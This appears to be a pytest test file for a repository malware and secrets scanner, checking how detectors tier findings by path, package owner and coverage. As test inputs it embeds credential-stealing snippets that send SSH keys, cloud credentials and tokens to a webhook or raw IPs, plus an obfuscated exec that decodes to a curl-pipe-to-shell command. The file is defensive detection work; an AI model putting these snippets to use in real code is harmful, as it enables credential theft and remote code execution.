"""Ruleset 2026.11.07-7: the certbot secrets false positive and the dev-sweep fixes 1-5. Inert text only."""
import io
import zipfile

import pytest

import repo_scan
from detectors import behavior_patterns, credential_exfiltration as CE, run_detectors
from detectors.base import make_result
from detectors.context import DetectorContext
from detectors.pyast import parse_ok
from malware_proof import run_malware_proof_engine
from pillars import NO_LIMIT_REASON, PARTIAL_NOTE, compute_trust
from security import apply_gate

KEY = "-----BEGIN PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAtest\n-----END PRIVATE KEY-----\n"


def _scan(files: dict[str, str]) -> dict:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in files.items():
            z.writestr(f"o-r-abc123/{name}", data)
    buf.seek(0)
    orig = repo_scan.download_zip
    repo_scan.download_zip = lambda client, owner, repo: buf
    try:
        return repo_scan.scan_repo(None, "o", "r")
    finally:
        repo_scan.download_zip = orig


# ------------------------------------------------------------------ certbot: secrets in test/sample/asset paths

def test_certbot_style_asset_key_uses_the_new_review_rule():
    # 2026.11.07-8: info (was review in -7), consistent with the exact tests/ and docs/ fixture rule
    f = next(x for x in _scan({"certbot-ci/certbot_integration_tests/assets/key.pem": KEY})["findings"] if x["source"] == "Secrets")
    # -9: the shared classifier names the first non-shipping directory (certbot_integration_tests -> "tests")
    assert f["sev"] == "Low" and not f["strong"] and "non-shipping" in f["info_reason"] and "to info" in f["info_reason"]


@pytest.mark.parametrize("path", ["certbot-ci/certbot_integration_tests/assets/key.pem",
                                  "certbot/certbot/tests/testdata/rsa2048_key.pem",
                                  "certbot-nginx/tests/testdata/etc_nginx/sites-enabled/cert.key",
                                  "sample-config/keys/0000_key-certbot.pem", "docs/examples/server.key",
                                  "rules/yara/keys/fixture.pem"])
def test_test_and_sample_path_keys_are_review_not_strong(path):
    res = _scan({path: KEY})
    sec = [f for f in res["findings"] if f["source"] == "Secrets"]
    assert sec and not any(f["strong"] for f in sec), sec
    f = sec[0]
    assert res["secrets_strong"] == 0 and res["strong"] == 0
    # 2026.11.07-8: every such path is info (Low, no tier); in -7 the token-matched ones were review
    assert f["sev"] == "Low"
    d = next(x for x in res["detectors"] if x["detector"] == "repo_secrets")
    assert d["tier"] == "none_found" and not d["findings"]
    if "info_reason" in f:
        assert "Downgraded from strong to info" in f["info_reason"] and d["info_findings"]
    else:   # an exact tests/docs directory: the existing fixture rule
        assert "test/example/doc/source file" in f["rule"]


@pytest.mark.parametrize("path", ["key.pem", "src/server/key.pem", "deploy/prod.key"])
def test_the_same_key_elsewhere_is_still_strong(path):
    res = _scan({path: KEY})
    assert res["secrets_strong"] == 1
    g = apply_gate({"score": 90.0, "label": "Healthy", "factors": [], "notes": []},
                   {"level": "No unpatched issues found", "findings": [], "coverage": []}, [], res)
    assert g["trust_score"] <= 49 and "capped by evidence rule: strong secret" == g["limiting_reason"]


def test_sample_looking_aws_key_in_assets_is_review_but_real_looking_key_elsewhere_stays_strong():
    assert repo_scan.secret_review_reason("assets/config.py", "AWS access key id", "aws_key = 'AKIAABCDEFGHTESTKEY1'")
    # -9 (A1): every secret kind in a non-shipping path is info, not only private keys / sample-looking keys
    assert repo_scan.secret_review_reason("assets/config.py", "AWS access key id", "aws_key = 'AKIAQWERTYUIOPASDFGH'")
    assert repo_scan.secret_review_reason("src/config.py", "AWS access key id", "k = 'AKIAABCDEFGHTESTKEY1'") is None


# ------------------------------------------------------------------ item 1: data-flow detector owns Python files

def _behavior(files: dict[str, str]) -> dict:
    data = {"text": files, "py": {}, "binaries": [], "all_py_paths": set()}
    proof = run_malware_proof_engine(data, "o", "r", lambda f, ln: None)
    scan = {"ran": True, "malware_proof": proof, "findings": [],
            "ast_analysed_py": sorted(p for p, t in files.items() if parse_ok(p, t))}
    return next(r for r in run_detectors(DetectorContext.build(scan=scan, data=data)) if r["detector"] == "behavior_patterns")


def test_legacy_single_indicators_are_suppressed_for_ast_analysed_python():
    py = "import os, json\ncfg = open(os.path.expanduser('~/.aws/credentials')).read()\nenv = json.dumps(dict(os.environ))\n"
    r = _behavior({"pkg/client.py": py})
    assert r["findings"] == []
    assert {i["rule"] for i in r["info_findings"]} >= {"Credential access: reads credential files"}
    assert all("credential_exfiltration" in i["info_reason"] for i in r["info_findings"])


def test_legacy_single_indicators_are_kept_for_js_shell_and_unparseable_python():
    js = "const fs = require('fs');\nconst c = fs.readFileSync(require('os').homedir() + '/.aws/credentials');\n"
    broken = "import os\ncfg = open('~/.aws/credentials').read(\n"          # syntax error: no ast analysis
    r = _behavior({"lib/creds.js": js, "pkg/broken.py": broken})
    files = {f["file"] for f in r["findings"] if "reads credential files" in f["rule"]}
    assert files == {"lib/creds.js", "pkg/broken.py"}


def test_multi_signal_intent_pattern_is_kept_for_python():
    py = ("import os, requests\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
          "requests.post('https://discord.com/api/webhooks/1/x', data=key)\n")
    r = _behavior({"pkg/x.py": py})
    assert any(f["rule"] == "Credential-stealer pattern" and f["tier"] == "high_risk" for f in r["findings"])


# ------------------------------------------------------------------ item 2: dev tooling paths -> info

def test_single_indicators_in_dev_tooling_become_info():
    js = "const env = JSON.stringify(process.env);\nconsole.log(env.length);\n"
    r = _behavior({"scripts/release.js": js, "tools/dump.js": js})
    assert r["findings"] == [] and len(r["info_findings"]) == 2
    assert all("non-shipping path" in i["info_reason"] for i in r["info_findings"])   # -9: shared classifier wording
    py = "def backup():\n    return open('/home/u/.ssh/id_ed25519').read()\n"
    c = CE.detect(DetectorContext.build(scan={"ran": True, "malware_proof": {"findings": []}, "findings": []},
                                        data={"text": {"tasks.py": py, "pkg/core.py": py}}))
    assert [f["file"] for f in c["findings"]] == ["pkg/core.py"]           # tasks.py -> info, pkg/ -> review
    assert c["info_findings"][0]["file"] == "tasks.py" and "tasks.py" in c["info_findings"][0]["info_reason"]


# ------------------------------------------------------------------ item 3: the client's own credential file

OWN_FILE = {
    "docker": "import json, os, requests\ncfg = json.load(open(os.path.expanduser('~/.docker/config.json')))\n"
              "def push(registry):\n    requests.post(registry + '/v2/token', auth=cfg['auths'])\n",
    "kubernetes": "import os, requests\nkc = open(os.path.expanduser('~/.kube/config')).read()\n"
                  "def call(api):\n    requests.get(api, headers={'Authorization': kc})\n",
    "twine": "import configparser, requests\np = configparser.ConfigParser()\nrc = p.read('~/.pypirc')\n"
             "def upload(repo):\n    requests.post(repo, auth=rc)\n",
    "pip": "import requests\nconf = open('/etc/pip.conf').read()\ndef fetch(index):\n    requests.get(index, data=conf)\n",
}


@pytest.mark.parametrize("pkg", list(OWN_FILE))
def test_own_client_credential_file_is_not_flagged_but_foreign_package_is(pkg):
    code = OWN_FILE[pkg]
    own = CE.analyse_python("x.py", code, set(), owner_names={pkg})[0]
    other = CE.analyse_python("x.py", code, set(), owner_names={"acme", "stats"})[0]
    assert own == [], pkg
    assert [f["tier"] for f in other] == ["review"], pkg     # someone else's client file sent to a dynamic host


def test_owner_tokens_come_from_repo_and_package_names():
    ctx = DetectorContext.build(features={"full_name": "docker/docker-py"}, security={"package": {"name": "docker", "ecosystem": "PyPI"}})
    assert {"docker", "dockerpy", "py"} <= CE.owner_tokens(ctx)


# ------------------------------------------------------------------ item 4: sub-signal limits vs headline note

def _trust(*results):
    base = [make_result("osv_advisories", "Exposure", "ran", []), make_result("decoded_payload", "Behavior", "ran", [])]
    return compute_trust(base + list(results), {"score": 90.0, "label": "Healthy"})


def test_commit_history_limit_does_not_add_headline_partial_note():
    r = make_result("revival_takeover", "Integrity", "ran", [], coverage="partial",
                    coverage_detail="commit history read up to 300 commits before the release")
    t = _trust(r)
    assert not t["partial"] and PARTIAL_NOTE not in t["label"]
    assert "300 commits" in t["pillars"]["Integrity"]["coverage"]["text"]       # still shown in the detail


def test_truncated_content_scan_still_adds_headline_partial_note():
    r = make_result("behavior_patterns", "Behavior", "ran", [], coverage="partial",
                    coverage_detail="partial scan: 1500 of 2300 text files")
    assert r["content_truncated"] and PARTIAL_NOTE in _trust(r)["label"]


def test_unassessed_pillar_still_adds_headline_partial_note():
    t = _trust(make_result("release_delta", "Integrity", "not_assessed", reason="lookup failed"))
    assert t["partial"] and PARTIAL_NOTE in t["label"]


# ------------------------------------------------------------------ item 5: no limiting pillar

def test_no_findings_says_no_limiting_pillar():
    t = _trust(make_result("release_delta", "Integrity", "ran", []))
    assert t["limiting_reason"] == NO_LIMIT_REASON and t["limiting_pillar"] is None and t["limiting_kind"] is None
    assert "limited by" not in t["limiting_reason"]



# ================================================================== round 2 (ruleset 2026.11.07-8)

from detectors.base import enrich
from pillars import group_review, score_pillar


def _rv(rule, file, line=1, det="behavior_patterns"):
    return enrich({"sev": "Medium", "source": "t", "rule": rule, "file": file, "line": line, "detail": "", "fix": "",
                   "url": None, "strong": False}, det, "review")


def test_review_findings_count_once_per_rule_and_top_level_directory():
    fs = [_rv("Network: exfil-style endpoint", f"tests/unit/t{i}.py", i) for i in range(40)] + \
         [_rv("Network: exfil-style endpoint", "src/pkg/a.py"), _rv("Network: exfil-style endpoint", "src/pkg/b.py"),
          _rv("Other rule", "src/pkg/a.py", 9)]
    p = score_pillar("Behavior", [make_result("behavior_patterns", "Behavior", "ran", fs)])
    assert p["score"] == 100 - 3 * 8                               # groups: (rule, tests), (rule, src), (other, src)
    g = next(f for f in p["findings"] if f.get("group_size") == 40)
    grp = next(e for e in g["evidence"] if e["type"] == "group")
    assert grp["top_dir"] == "tests" and grp["count"] == 40 and len(grp["files"]) == 40 and "tests/unit/t0.py:0" in grp["files"]


def test_grouping_never_merges_high_risk_and_keeps_root_files_separate():
    hr = [enrich({**_rv("x", f"src/f{i}.py"), "strong": True}, "behavior_patterns", "high_risk") for i in range(2)]
    root = [_rv("y", "setup.py"), _rv("y", "tasks.py")]
    out = group_review(hr + root)
    assert sum(f["tier"] == "high_risk" for f in out) == 2
    assert [f.get("group_size") for f in out if f["tier"] == "review"] == [2]   # both root files: group "."


def test_ssh_config_known_hosts_authorized_keys_are_not_sources():
    for p in ("~/.ssh/config", "~/.ssh/known_hosts", "~/.ssh/authorized_keys"):
        code = f"import os, requests\nd = open(os.path.expanduser('{p}')).read()\nrequests.post('http://198.51.100.3/x', data=d)\n"
        assert CE.analyse_python("pkg/x.py", code, set(), owner_names={"acme"})[0] == [], p
    for p in ("~/.ssh/id_ed25519", "~/.ssh/deploy.pem", "~/.ssh/github_rsa", "~/.ssh/work_ecdsa"):
        code = f"import os, requests\nd = open(os.path.expanduser('{p}')).read()\nrequests.post('http://198.51.100.3/x', data=d)\n"
        assert [f["tier"] for f in CE.analyse_python("pkg/x.py", code, set(), owner_names={"acme"})[0]] == ["high_risk"], p


SSH_LIB_CODE = ("import os, socket, requests\n"
                "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
                "agent = os.environ['SSH_AUTH_SOCK']\n"
                "def connect(host):\n    requests.post(host, data={'k': key, 'a': agent})\n")


@pytest.mark.parametrize("lib", ["paramiko", "asyncssh", "fabric"])
def test_ssh_client_libraries_own_ssh_keys_and_agent_socket(lib):
    assert CE.analyse_python(f"{lib}/client.py", SSH_LIB_CODE, set(), owner_names={lib})[0] == []


def test_unrelated_package_reading_ssh_private_key_is_unchanged():
    # dynamic destination: review (as before); raw IP: high_risk (as before)
    dyn = CE.analyse_python("pkg/x.py", SSH_LIB_CODE, set(), owner_names={"acme", "stats"})[0]
    assert [f["tier"] for f in dyn] == ["review"] and "Bulk" in dyn[0]["rule"]
    raw = SSH_LIB_CODE.replace("requests.post(host,", "requests.post('http://198.51.100.8/k',")
    assert [f["tier"] for f in CE.analyse_python("pkg/x.py", raw, set(), owner_names={"acme"})[0]] == ["high_risk"]


def test_ssh_alias_list_is_explicit_and_documented():
    assert CE.SSH_CLIENT_LIBS == {"paramiko", "asyncssh", "fabric"}
    import inspect
    assert "HAND-MAINTAINED" in inspect.getsource(CE)



# ================================================================== round 3 (ruleset 2026.11.07-9): shared classifier

from detectors.paths import non_shipping


@pytest.mark.parametrize("path, expect", [
    ("tests/a.py", True), ("pkg/testdata/x.py", True), ("docs/_static/js/a.js", True), ("site/_build/x.js", True),
    ("tools/release.py", True), ("scripts/x.sh", True), (".agents/skills/x.py", True), ("tasks.py", True),
    ("noxfile.py", True), ("certbot-ci/certbot_integration_tests/x.py", True), ("sample-config/x.py", True),
    ("src/pkg/a.py", False), ("setup.py", False), (".github/workflows/ci.yml", False), ("pkg/toolsmith.py", False),
])
def test_non_shipping_classifier(path, expect):
    assert bool(non_shipping(path)) is expect, path


def _cscan(files):
    return DetectorContext.build(scan={"ran": True, "malware_proof": {"findings": [], "layers": {}}, "findings": []}, data={"text": files})


def test_raw_ip_url_in_testdata_is_info_in_src_is_review():
    code = "URL = 'http://37.120.14.20:8080/feed'\n"   # inert text; documentation ranges are ignored by this rule
    r = _behavior({"pkg/testdata/feed.py": code, "src/pkg/feed.py": code})
    assert [f["file"] for f in r["findings"] if "raw IP" in f["rule"]] == ["src/pkg/feed.py"]
    info = [i for i in r["info_findings"] if "raw IP" in i["rule"]]
    assert [i["file"] for i in info] == ["pkg/testdata/feed.py"] and "non-shipping" in info[0]["info_reason"]


def test_named_credential_to_dynamic_host_in_tools_is_info_in_src_is_review():
    code = "import os, requests\ndef send(url):\n    requests.post(url, data=os.environ['GITHUB_TOKEN'])\n"
    out = {r["detector"]: r for r in run_detectors(_cscan({"tools/notify.py": code, "src/pkg/notify.py": code}))}
    c = out["credential_exfiltration"]
    assert [f["file"] for f in c["findings"]] == ["src/pkg/notify.py"] and c["tier"] == "review"
    assert [i["file"] for i in c["info_findings"]] == ["tools/notify.py"]


def test_decoded_payload_under_tests_stays_high_risk():
    import base64, zlib
    enc = base64.b64encode(zlib.compress(b'import os; os.system("curl http://198.51.100.4/x | sh")')).decode()
    code = f"import base64, zlib\nexec(zlib.decompress(base64.b64decode('{enc}')).decode())\n"
    data = {"text": {"tests/helpers/boot.py": code}, "py": {}, "binaries": [], "all_py_paths": set()}
    from malware_proof import scan_ast_deobfuscation
    proof = {"findings": scan_ast_deobfuscation(data["text"], lambda f, ln: None)["findings"], "layers": {"layer1": {"status": "ran"}}}
    r = next(x for x in run_detectors(DetectorContext.build(scan={"ran": True, "malware_proof": proof, "findings": []}))
             if x["detector"] == "decoded_payload")
    assert r["tier"] == "high_risk" and r["findings"][0]["file"] == "tests/helpers/boot.py"


def test_committed_binary_in_fixtures_is_info():
    f = {"sev": "Medium", "source": "Behavior", "cat": "Binary", "rule": "Binary: compiled executable committed to the repo",
         "file": "tests/fixtures/tool.exe", "line": 1, "detail": "", "fix": "", "url": None, "strong": False}
    proof = {"findings": [f, {**f, "file": "bin/tool.exe"}], "layers": {"behavior": {"status": "ran"}}}
    r = next(x for x in run_detectors(DetectorContext.build(scan={"ran": True, "malware_proof": proof, "findings": []}))
             if x["detector"] == "committed_binary")
    assert [x["file"] for x in r["findings"]] == ["bin/tool.exe"] and [i["file"] for i in r["info_findings"]] == ["tests/fixtures/tool.exe"]


def test_sphinx_static_phantom_is_info_but_phantom_with_network_stays_high_risk():
    from detectors import tagless_release
    from release_helpers import history, npm_release, with_git
    plain = npm_release("1.2.0", "2026-03-01T00:00:00Z", files={"docs/_static/searchtools.js": "var Search = {};\n"})
    rc = with_git(history([plain]), default_tree={"index.js"}, tags=["v1.2.0"], matched="v1.2.0")
    r = tagless_release.detect(DetectorContext.build(releases=rc))
    assert r["findings"] == [] and r["info_findings"][0]["file"] == "docs/_static/searchtools.js"
    net = npm_release("1.2.0", "2026-03-01T00:00:00Z", files={"docs/_static/beacon.js": "const https = require('https');\nhttps.get('https://198.51.100.7/b');\n"})
    rc2 = with_git(history([net]), default_tree={"index.js"}, tags=["v1.2.0"], matched="v1.2.0")
    r2 = tagless_release.detect(DetectorContext.build(releases=rc2))
    assert [f["tier"] for f in r2["findings"]] == ["high_risk"]


def test_ruleset_is_frozen():
    from detectors import version
    assert version.RULESET_FROZEN is True and version.RULESET_VERSION == "2026.11.08-10"
